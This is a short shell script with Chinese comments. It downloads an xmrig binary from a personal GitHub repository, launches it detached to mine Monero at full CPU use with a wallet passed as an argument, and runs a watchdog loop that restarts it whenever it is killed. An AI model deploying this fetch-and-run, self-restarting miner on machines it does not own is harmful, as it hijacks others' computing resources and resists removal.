
#! /bin/sh
PRO_NAME=xmrig_0c 
while true;do
	wget -T 15 -c -O ./xmrig_0c https://github.com/ak6665607/xmrGF/raw/main/xmrig && break
done 
chmod 777 ./xmrig_0c
qianbao=$1
CMD="setsid ./xmrig_0c --coin=monero -o pool.minexmr.com:4444 -u $qianbao --randomx-mode=fast --cpu-max-threads-hint 100 --threads=8" 
while true ; do
     #用ps获取$PRO_NAME进程数量
     NUM=`ps aux | grep -w ${PRO_NAME} | grep -v grep |wc -l`
     #echo $NUM
     #少于1，重启进程
     if [ "${NUM}" -lt "1" ];then
         echo "${PRO_NAME} was killed"
         $CMD
    #大于1，杀掉所有进程，重启
    elif [ "${NUM}" -gt "1" ];then
        echo "more than 1 ${PRO_NAME},killall ${PRO_NAME}"
        killall -9 $PRO_NAME
        $CMD
     fi
     #kill僵尸进程
     NUM_STAT=`ps aux | grep -w ${PRO_NAME} | grep T | grep -v grep | wc -l`
     if [ "${NUM_STAT}" -gt "0" ];then
         killall -9 ${PRO_NAME}
         $CMD
    fi
     sleep 5s
done
exit 0
